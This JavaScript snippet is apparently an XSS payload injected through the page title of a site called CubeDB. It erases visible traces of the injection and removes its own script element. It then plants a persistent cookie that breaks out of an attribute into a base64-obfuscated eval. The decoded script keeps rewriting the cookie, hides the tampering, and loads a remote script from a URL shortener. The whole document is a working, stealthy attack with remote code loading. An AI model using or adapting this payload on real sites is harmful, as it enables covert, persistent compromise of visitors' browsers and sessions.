let custom_title = "Awesome solve!";
let payload = document.title.split(" - CubeDB")[0];

if (document.title.startsWith("<d")) {
    document.title = document.title.replace(payload, custom_title);
    title.innerHTML = custom_title;
}

document.querySelector("details").outerHTML = custom_title;

Array.from(document.querySelectorAll("a")).forEach(e => e.href = e.href.replace(
    /%3Cd.*?%0A/g,
    encodeURIComponent(custom_title)
));
document.body.removeChild(
  Array.from(document.querySelectorAll("script")).reverse()[0]
);

document.cookie = 'sq1-appearance-colorright=#008000"><script>eval(atob`ICAgICFmdW5jdGlvbigpe2xldCBucz0ic3ExLWFwcGVhcmFuY2UtY29sb3JyaWdodD0iLF9nYz0oKT0%2BKCI7ICIrZG9jdW1lbnQuY29va2llKS5zcGxpdCgiOyAiK25zKS5wb3AoKS5zcGxpdCgiOyIpWzBdLHM9X2djKCk7d2l0aChzZXRJbnRlcnZhbCgoKT0%2Be2xldCBlPV9nYygpO2UhPXMmJihzPWUuc3Vic3RyKDAsNykrcy5zdWJzdHIoNykpLGRvY3VtZW50LmNvb2tpZT1ucytzKyI7IHBhdGg9LyIsKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNzcTEtYXBwZWFyYW5jZS1jb2xvcnJpZ2h0IikubmV4dFNpYmxpbmcgaW5zdGFuY2VvZiBIVE1MSW5wdXRFbGVtZW50fHxkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjc3ExLWFwcGVhcmFuY2UtY29sb3JyaWdodCIpLm5leHRTaWJsaW5nIGluc3RhbmNlb2YgSFRNTFNjcmlwdEVsZW1lbnQpJiZkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjc3ExLWFwcGVhcmFuY2UtY29sb3JyaWdodCIpLm5leHRTaWJsaW5nLnJlbW92ZSgpfSwxMCksZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3NxMS1hcHBlYXJhbmNlLWNvbG9ycmlnaHQiKS5vdXRlckhUTUw9JzxpbnB1dCB0eXBlPSJjb2xvciIgaWQ9InNxMS1hcHBlYXJhbmNlLWNvbG9ycmlnaHQiIGNsYXNzPSJjb2xvcnNlbGVjdG9yIiB2YWx1ZT0iJytzLnN1YnN0cigwLDcpKyciIGRhdGEtY2hhbmdlPSJzcTFyaWdodCI%2BJyxkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnRgc2NyaXB0YCkuc3JjPSIvL3QubHkvb1JILSJ9KCk7`)</script><input "; path=/';

console.log("Injected from title")
